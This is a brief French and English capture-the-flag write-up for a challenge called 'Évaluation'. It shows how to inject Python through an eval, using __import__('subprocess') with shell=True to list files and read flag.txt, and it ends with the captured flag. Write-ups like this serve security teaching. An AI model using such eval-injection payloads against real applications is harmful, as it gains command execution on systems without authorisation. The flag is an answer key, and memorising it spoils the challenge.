# Évaluation

## Write-up (français)

On peut importer le module subproccess afin de recup le contenu de notre commande:

```python
__import__('subprocess').check_output("ls", shell=True)
# on a le nom du fichier du flag
__import__('subprocess').check_output("cat flag.txt", shell=True)
```


## Write-up (english)

We can import the subproccess module to get the content of our command:

```python
__import__('subprocess').check_output("ls", shell=True)
# we now have the name of the flag file
__import__('subprocess').check_output("cat flag.txt", shell=True)
```



## Flag

`flag-Ev4L_1s_R4R3LY_@_G00D_1d34`

